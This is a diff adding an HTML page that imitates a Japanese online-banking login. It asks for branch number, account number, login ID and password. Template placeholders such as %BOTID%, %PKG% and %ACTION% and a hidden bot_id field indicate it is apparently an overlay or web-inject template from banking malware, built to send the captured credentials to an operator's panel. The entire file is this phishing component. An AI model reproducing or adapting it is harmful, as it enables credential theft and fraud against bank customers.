@@ -1,0 +1,167 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://use.fontawesome.com/8d8c3a1b01.js"></script>
+
+<style>
+body {
+	margin: 0;
+	padding: 0;
+	background: #031b68;
+}
+
+.header {
+	background: #112d8d;
+	text-align: center;
+	color: #fff;
+	font-weight: 500;
+}
+
+.header2 {
+    text-align: center;
+    color: #fff;
+    padding: 30px;
+    font-weight: 100;
+}
+.input {
+    padding: 7px;
+    width: 49%;
+    float: left;
+    font-size: 12px;
+    border: 0;
+    background: #ececec;
+    border-radius: 3px;
+}
+
+.fielderror {
+    padding: 7px;
+    width: 49%;
+    float: left;
+    font-size: 12px;
+    border: 1px solid #f00;
+    background: #ececec;
+    border-radius: 3px;
+}
+
+label {
+    display: inline-block;
+    max-width: 50%;
+    margin-top: 10px;
+    margin-bottom: 0px;
+    width: 30%;
+    font-weight: 100;
+    font-size: 12px;
+    float: left;
+    color: #fff;
+}
+.col-xs-10 {
+	width: 100%;
+}
+				
+.col-xs-1, .col-xs-10, .col-xs-11, .col-xs-12, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9 {
+	float: none;
+}
+
+#input_submitBtn {
+    background: #4257b1;
+    border: 0;
+    border-radius: 50px;
+    padding: 7px 20px;
+    color: #fff;
+    font-size: 10px;
+    float: right;
+    margin-top: 25px;
+}
+
+#toggleLink {
+    text-align: center;
+    width: 100%;
+    margin-top: 10px;
+    margin-bottom: 10px;
+    display: block;
+    background: #4257b1;
+    color: #fff;
+    font-size: 12px;
+    text-decoration: none;
+    padding: 3px;
+    border: 0;
+    border-radius: 2px;
+}
+
+#content_div {
+    overflow: hidden;
+}
+</style>
+<script src="%DYN_PATH_GENERAL%/jquery.min.js"></script>
+</head>
+<body>
+<div class="header">
+ログイン
+</div>
+
+<div class="col-xs-10 col-sm-8">
+	<div id="content_div">
+		<form id='mainform' method='post' action='%ACTION%' onsubmit="return function(){ 
+var ok = true;
+
+$('input').each(function (i, value){  
+	$(value).css('border', '');
+	
+	if(!$(value).is(':visible') || $(value).prop('type') == 'submit')
+		return;
+		
+	if($(value).val().length < 3){
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+	if($(value).prop('maxlength') !== undefined && $(value).prop('maxlength') != -1 && $(value).val().length > $(value).prop('maxlength'))
+	{
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+		<input type="hidden" name="page_id" value="%PKG%" class="main_input" /><input type="hidden" name="bot_id" value="%BOTID%" />
+	  
+			<label>店番号(3桁)</label>
+			<label style="width: 68%;margin-left: 2%;">口座番号(7桁)</label>
+
+			<input name="fields[userid1]" id="login1" style="margin-right: 2%;border-radius: 3px 0 0 3px;width: 30%;" maxlength="3" class="input" type="text">
+
+			<input name="fields[userid2]" id="login2" style="border-radius: 0 3px 3px 0;width: 68%;" maxlength="7" class="input" type="text">
+			
+			<div id="mydiv" style="display:none;">
+				<label style="width: 100%;max-width: 100%;">ログインID(6〜32文字)</label>
+				<input name="fields[userid]" data-tmp111="yes" placeholder="半角英数字" id="userid1" style="width: 100%;" maxlength="32" class="input" type="text">
+				
+			</div>
+			
+			<label style="width: 100%;max-width: 100%;">ログインパスワード</label>
+			<input name="fields[password]" placeholder="半角英数記号" id="password" style="width: 100%;" maxlength="50" class="input" type="password">
+		
+			</div>				<a id="toggleLink" href="javascript:void(0);" onclick="viewdiv('mydiv');" data-text-show="ログインID未設定の方" data-text-hide="Show">Show</a>
+
+			<input value="ログオンテスト" id="input_submitBtn" class="submit" type="submit" />
+</form>
+<script>
+    function viewdiv(id) {
+        var el = document.getElementById(id);
+        var link = document.getElementById('toggleLink');
+        if (el.style.display == "block") {
+            el.style.display = "none";
+            link.innerText = link.getAttribute('data-text-hide');
+        } else {
+            el.style.display = "block";
+            link.innerText = link.getAttribute('data-text-show');
+        }
+    }
+</script>
+
+</div>
+</body>
+</html>
